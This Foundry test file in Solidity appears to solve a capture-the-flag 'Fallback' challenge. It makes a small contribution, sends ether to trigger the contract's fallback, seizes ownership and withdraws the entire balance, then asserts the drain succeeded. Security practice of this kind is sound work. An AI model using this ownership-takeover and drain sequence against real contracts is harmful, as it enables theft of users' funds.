// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/fallback.sol";

contract fallbackTest is Test {
    Fallback public fb;

    function setUp() public {
        fb = new Fallback();
    }

    function testBalanceZero() public {
        address sender = address(0xb1BfB47518E59Ad7568F3b6b0a71733A41fC99ad);
        vm.startPrank(sender);
        vm.deal(sender, 10000000000000000000000000);
        console2.log(sender.balance);

        fb.contribute{value: 0.0001 ether}();
        // uint sendValue = fb.contributions(sender);
        address(fb).call{value: 0.0001 ether}("");
        assertEq(fb.owner(), 0xb1BfB47518E59Ad7568F3b6b0a71733A41fC99ad);
        fb.withdraw();
        assertEq(address(fb).balance, 0);
    }
}
